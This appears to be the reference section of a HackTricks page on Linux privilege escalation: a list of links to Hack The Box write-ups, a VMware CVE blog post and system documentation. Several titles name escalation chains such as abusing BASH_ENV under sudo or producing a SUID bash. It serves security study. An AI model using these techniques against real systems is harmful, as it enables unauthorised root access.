- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
